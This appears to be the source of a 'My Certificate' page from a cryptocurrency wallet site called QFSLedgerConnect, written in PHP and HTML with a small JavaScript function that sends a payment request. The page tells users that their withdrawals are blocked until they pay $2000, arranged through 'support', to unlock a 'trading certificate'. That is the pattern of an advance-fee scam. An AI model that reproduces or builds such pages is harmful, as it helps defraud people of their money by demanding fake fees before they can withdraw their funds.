<?php require "php/general.php"; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <?php 
        use Src\Config\Head; 
        Head::tags();
    ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="../src/assets/css/general.css">
    <link rel="stylesheet" href="../assets/css/line-awesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.9.4/Chart.js"></script>
    <title>QFSLedgerConnect - Storage for your wallets</title>
    <style>
        .table td {
            padding: 1rem!important;
        }
    </style>
</head>
<body class="data-dark-body">
    <?php include "src/template/quick-notice.php"; ?>
    <div class="section">
        <div class="wrapper d-flex align-items-stretch">
            <?php include "src/template/sb/sidebar.php"; ?>

            <section class="content p-4 p-md-5 pt-5 certificate">
                <?php include "src/template/head.php"; ?>
                <main>
                    <header>
                        <p class="title">My Certificate</p>
                    </header>
                    <section class="data-section">
                        <div class="text-center">
                            <div class="sub-head mb-0">
                                Your Trading Certificate
                            </div>
                            <small>Complete the payment to unlock your trading certificate and enable secure withdrawals</small>
                        </div>

                        <div class="card-box text-center py-4 mt-4">
                            <i class="las la-key" style="font-size: 40px;"></i>
                            <div>Your certificate is locked. Complete the payment to unlock it.</div>
                            <div class="mt-3">
                                <button class="btn btn-link py-3 px-3" style="color: #fff!important; padding: 1% 1%!important;" data-bs-toggle="modal" data-bs-target="#certificate">Unlock Certificate</button>
                            </div>
                        </div>

                        <div class="card-box mt-3">
                            <div class="sub-sub-head">
                                Why This Matters?
                            </div>
                            <div>
                                <ul class="mt-2">
                                    <li>Boosts confidence from clients, investors, or employers.</li>
                                    <li>Many firms (banks, prop firms, investment houses) require or prefer certified traders.</li>
                                    <li>Can help you qualify for regulated roles (e.g., broker, portfolio manager).</li>
                                    <li>Many certification programs connect you with professional traders, mentors, and institutions.</li>
                                    <li>Certified traders may get easier access to funding programs (like prop firms).</li>
                                    <li>Some brokers or institutions give priority to certified professionals.</li>
                                </ul>
                            </div>
                        </div>
                    </section>

                    <div class="modal" tabindex="-1" aria-labelledby="certificate" id="certificate" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered">
                            <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="exampleModalLabel" class="payment-head sub-sub-head text-center">Certificate
                                    <div>
                                        <small>To view your certificate. Please complete the payment.</small>
                                    </div>
                                </h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="modal-details text-center">
                                    <div style="position: relative;">
                                        <small>Payment Required To Access Certificate</small>
                                        <i class="las la-key floatLock"></i>
                                    </div>
                                    <div class="mt-2">
                                        START A CONVERSATION WITH OUR SUPPORT TO GUIDE YOU ON MAKING THE PAYMENT. Once payment is confirmed you would be able to see your certificate and finalize your withdrawal process.
                                        <div class="sub-head text-success mt-2">
                                            $2000
                                        </div>
                                </div>
                            </div>
                            <div class="modal-footer justify-content-center">
                                <button type="button" class="btn btn-success" onclick="unlock(this)">Pay & Unlock</button>
                            </div>
                        </div>
                    </div>
                </main>
            </section>
        </div>
    </div>
</body>
<script src="../src/assets/js/main.js"></script>
<script src="../src/assets/js/general.js"></script>
<script>
    let data = {
        type: "error",
        status: 0,
        message: "fill",
        content: ""
    }
    function unlock(self) {
        let payload = {
            part: "user",
            action: "certificate",
            val: {}
        }

        data.type = "success"
        data.content = "Your request has been sent for confirmation."
        new Func().notice_box(data)
        new Func().request("../request.php", JSON.stringify(payload), 'json')
        .then(val => {
            new Func().notice_box(val)
            if(val.status === 1) {
                setTimeout(() => {
                    location.reload()
                }, 1000);
            }
        })
    }
</script>